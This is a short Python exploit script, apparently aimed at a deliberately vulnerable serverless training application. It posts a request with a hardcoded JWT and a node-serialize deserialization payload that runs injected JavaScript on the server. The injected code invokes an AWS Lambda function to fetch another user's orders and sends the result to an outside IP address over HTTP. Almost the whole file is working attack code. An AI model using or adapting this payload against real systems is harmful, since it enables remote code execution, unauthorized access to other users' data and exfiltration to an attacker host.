import requests
#Gets the orders from a given user ID
jwtCookie = "eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI3OGZkMzRkYy0xYjNhLTRhYWMtOTcxMS02YWZkZmNmMDEyY2QiLCJldmVudF9pZCI6ImFhMTY1ODA5LTQxZmMtNGY2ZC1iODAwLWFlMjY5MTg2MmE1ZiIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODg5NTQ3MjAsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTI4ODM2MywiaWF0IjoxNTg5Mjg0NzYzLCJqdGkiOiJjMGU5NDU2Mi0zNDAyLTRkZjUtOTE1Ny01NThiYTVhMzhhYzYiLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNzhmZDM0ZGMtMWIzYS00YWFjLTk3MTEtNmFmZGZjZjAxMmNkIn0.Z8EVKo8Bi9_BEBH76epCzXnKxmD9yCWKbYMRRmhVgb51Dod4kJ-b77l6F_aG19ZjGTq7_flp86I-3tvUJjyeNc9DaJU9WfGUFv5IvbZxSXlT7a71mOS-1SFemzzOIKeTXUonKzEepzxiExvcW09WAcauHGtN-72umAeQS1330YmItfO6AAsYC1mhugdkCCYgKX9IS7fXCXHG_0v-DykSlls-Z8EZcKSCSbl8jfGJ9FJ3cDvMltMEs-Gn224OQkx-8CTKsiCCjDgUUljtNOAH5QbEsh5GUxofO3OgNyMQFj4zevVkbBA5YBPON0PzM5igWr9uxtC0Xsu_8yRTvuK0rg"

headers = {
    'Authorization': jwtCookie
}

response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ORDER-ORDERS\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"user\": \"4410a8d4-f3a9-43c4-9c60-061b16767a61\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"http://92.222.72.208\"+JSON.stringify(d));}); }()", "cart-id":""})
print(response.content)


